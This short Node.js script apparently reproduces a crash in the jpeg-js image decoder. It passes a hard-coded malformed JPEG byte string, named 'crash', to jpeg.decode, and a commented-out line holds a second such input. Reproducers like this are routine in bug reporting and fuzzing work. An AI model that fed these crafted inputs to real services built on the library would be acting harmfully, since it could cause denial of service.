let jpeg = require('jpeg-js');
//let buf = Buffer.from("ffd8381cfe8f68", "hex")
let crash = "ffd8ffdaffff00001b97054bff7fff00fa60"
let buf = Buffer.from(crash, "hex")
jpeg.decode(buf);
